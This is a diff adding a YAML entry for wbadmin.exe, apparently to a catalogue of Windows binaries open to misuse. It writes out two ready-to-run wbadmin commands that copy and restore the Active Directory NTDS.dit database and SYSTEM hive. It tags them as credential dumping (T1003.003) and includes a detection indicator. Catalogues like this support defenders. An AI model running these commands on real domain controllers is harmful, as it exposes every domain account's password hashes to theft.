@@ -1,0 +1,26 @@
+---
+Name: wbadmin.exe
+Description: Command line utility used to export Active Directory.
+Author: 'Chris Eastwood'
+Created: 2024-04-05
+Commands:
+  - Command: wbadmin start backup -backupTarget:C:\temp\ -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
+    Description: Extract NTDS.dit (and SYSTEM hive) into backup virtual hard drive file (.vhdx)
+    Usecase: Dumping of Active Directory NTDS.dit database
+    Category: Dump
+    Privileges: Administrator, Backup Operators, SeBackupPrivilege
+    MitreID: T1003.003
+    OperatingSystem: Windows
+  - Command: wbadmin start recovery -version:<VersionIdentifyer> -recoverytarget:C:\temp -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
+    Description: Restore a version of NTDS.dit (and SYSTEM hive) into file path
+    Usecase: Dumping of Active Directory NTDS.dit database
+    Category: Dump
+    Privileges: Administrator, Backup Operators, SeBackupPrivilege
+    MitreID: T1003.003
+    OperatingSystem: Windows
+Full_Path:
+  - Path: C:\Windows\System32\wbadmin.exe
+Code_Sample:
+  - Code:
+Detection:
+  - IOC: wbadmin.exe with command line including "NTDS.dit"
